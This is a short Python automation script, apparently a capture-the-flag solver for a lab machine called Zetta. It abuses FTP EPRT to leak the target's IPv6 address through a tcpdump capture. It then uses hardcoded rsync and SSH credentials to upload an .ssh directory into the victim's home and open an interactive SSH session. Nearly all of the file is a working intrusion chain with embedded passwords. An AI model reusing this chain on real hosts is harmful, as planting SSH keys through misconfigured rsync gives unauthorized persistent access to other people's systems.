import pexpect
import sys
import os

creds = "2aHR9qyrdPSnTUbCJDX2zTlppkY5SXbl"
ipv6= os.popen('ifconfig | grep "<global>" |cut -d " " -f10').read().strip('\n')
ftp_EPRT = "quote EPRT |2|"+ipv6+"|8864|"

tcpdump = pexpect.spawn("tcpdump -i tun0 ip6")

print("Connecting to ftp 10.10.10.156...")
ftp = pexpect.spawn("ftp 10.10.10.156")
ftp.expect("Name*")
print("Input User...")
ftp.sendline(creds)
print("Input Password...")
ftp.expect("Password:")
ftp.sendline(creds)


ftp.expect("ftp> ")
print("Sending EPRT command...")
ftp.sendline(ftp_EPRT)
ftp.expect("ftp> ")
print("Sending LIST command...")
ftp.sendline("quote LIST")
#ftp.interact()
tcpdump.expect("IP6 kali.8864 >*")
zettaipv6 = tcpdump.readline()[1:30]
print("Ipv6 of Box Zetta is: "+zettaipv6)


rsync_password = "computer"
ssh_passphrase = "qweasdzxc"
upload_command = "rsync -av .ssh roy@["+zettaipv6+"]::home_roy --port=8730"
login = "ssh -i zettaroy roy@10.10.10.156"

upload = pexpect.spawn(upload_command)
print("rsync to roy@10.10.10.156...")
upload.expect("Password: ")
upload.sendline(rsync_password)
login = pexpect.spawn(login)
login.expect("Enter passphrase for key 'zettaroy': ")
login.sendline(ssh_passphrase)
login.interact()
